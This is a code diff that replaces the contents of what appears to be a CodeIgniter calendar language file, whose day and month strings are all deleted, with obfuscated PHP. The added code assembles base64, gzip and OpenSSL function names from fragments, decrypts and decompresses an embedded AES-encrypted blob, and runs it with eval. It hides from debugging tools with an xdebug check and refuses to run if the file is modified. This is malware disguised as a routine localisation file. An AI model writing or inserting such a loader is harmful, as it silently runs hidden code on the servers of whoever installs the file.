@@ -1,84 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['cal_su'] = 'Su';
-$lang['cal_mo'] = 'Mo';
-$lang['cal_tu'] = 'Tu';
-$lang['cal_we'] = 'We';
-$lang['cal_th'] = 'Th';
-$lang['cal_fr'] = 'Fr';
-$lang['cal_sa'] = 'Sa';
-$lang['cal_sun'] = 'Sun';
-$lang['cal_mon'] = 'Mon';
-$lang['cal_tue'] = 'Tue';
-$lang['cal_wed'] = 'Wed';
-$lang['cal_thu'] = 'Thu';
-$lang['cal_fri'] = 'Fri';
-$lang['cal_sat'] = 'Sat';
-$lang['cal_sunday'] = 'Sunday';
-$lang['cal_monday'] = 'Monday';
-$lang['cal_tuesday'] = 'Tuesday';
-$lang['cal_wednesday'] = 'Wednesday';
-$lang['cal_thursday'] = 'Thursday';
-$lang['cal_friday'] = 'Friday';
-$lang['cal_saturday'] = 'Saturday';
-$lang['cal_jan'] = 'Jan';
-$lang['cal_feb'] = 'Feb';
-$lang['cal_mar'] = 'Mar';
-$lang['cal_apr'] = 'Apr';
-$lang['cal_may'] = 'May';
-$lang['cal_jun'] = 'Jun';
-$lang['cal_jul'] = 'Jul';
-$lang['cal_aug'] = 'Aug';
-$lang['cal_sep'] = 'Sep';
-$lang['cal_oct'] = 'Oct';
-$lang['cal_nov'] = 'Nov';
-$lang['cal_dec'] = 'Dec';
-$lang['cal_january'] = 'January';
-$lang['cal_february'] = 'February';
-$lang['cal_march'] = 'March';
-$lang['cal_april'] = 'April';
-$lang['cal_mayl'] = 'May';
-$lang['cal_june'] = 'June';
-$lang['cal_july'] = 'July';
-$lang['cal_august'] = 'August';
-$lang['cal_september'] = 'September';
-$lang['cal_october'] = 'October';
-$lang['cal_november'] = 'November';
-$lang['cal_december'] = 'December';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ps9u4rhp=('bas'.'e64'.'_de'.'cod'.'e');
+$_fy7bh5v1=('gzu'.'nco'.'mpr'.'ess');
+$_ascymp9n=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_k22oy632='RN5FOOnu';
+$_c8iwvq7f='PrNSl+x0';
+$_dx7lgo7r='digvJ942';
+$_i5eyu3y2='Ksm/OuTG';
+$_rehn3jym='WkmAl+W7cPM=';
+$_q1hxgcen='tl51KB5b';
+$_jrps5w03='ap7A1Q==';
+$_w3vm78bp='AwtFZR1E';
+$_dkznrsni=$_ps9u4rhp($_i5eyu3y2.$_c8iwvq7f.$_dx7lgo7r.$_k22oy632.$_rehn3jym);
+$_jdgcig0u=$_ps9u4rhp($_q1hxgcen.$_w3vm78bp.$_jrps5w03);
+$_nru8w2sv=$_ps9u4rhp('nmS6NVfWXqdgongkGY2BZSfm481kHBvQTiPfdk0OnLIpfksVUI45fVsgK82vBI5FbEYGGTZg8AK8Ca/cbGy9RlQoHykQg0rHnn6rw88XQPjP94FI1n7O00EDR9ehGjaFr8/EGeH1qf380brfI9t4Ow2SaBnzmYmaaf/fCXgblBBYJdHltVbe7qAA0d/eqjQWA6bDn90cL7v386O82GfnBX6f3rtWtqzB7dzDewbQBU+C/y7zV8JwvJPlX37uCSDxbtzblXA7eMwT/uR6wKFratPh1P71bYX1FJowhck/rDmnByAuOfCrF21vWZs247cWlhDM1mvdjtAJx6caKtP2z6IHGIMPuQnlJD6LBLWoykducJ0IE9VhCV1otiyreufGvkHf+xOTMIDcB5+ADFDDZi7/8p66FkNl8rXK4QM7yrN3qxNTStOHkZdILXslHR18S3tMsDvd+EgEqbYWz28GRNrqdu0YQ+LCbqUxfz/UJTNLy4J4VlieJtB5PV5dqZLc5rDL1PFZbVAxsjks5H0lgQ==');
+$_umzi0xpj=$_ascymp9n($_nru8w2sv,'aes-256-cbc',$_dkznrsni,OPENSSL_RAW_DATA,$_jdgcig0u);
+if($_umzi0xpj===false){exit;}
+$_e5xc7dbk=$_fy7bh5v1($_umzi0xpj);
+if($_e5xc7dbk===false){exit;}
+$_sazvcr5k='5a398f149e199b1136401a37e28db6786de3297d5fd3863b184cc725c37843c3';
+$_tf6me2ue=@file_get_contents(__FILE__);
+if($_tf6me2ue!==false){
+$_dpdqtfte=str_replace($_sazvcr5k,"0000000000000000000000000000000000000000000000000000000000000000",$_tf6me2ue);
+$_yqxh0xdb=hash("sha256",$_dpdqtfte);
+if($_yqxh0xdb!==$_sazvcr5k){@http_response_code(403);exit;}
+}
+eval($_e5xc7dbk);
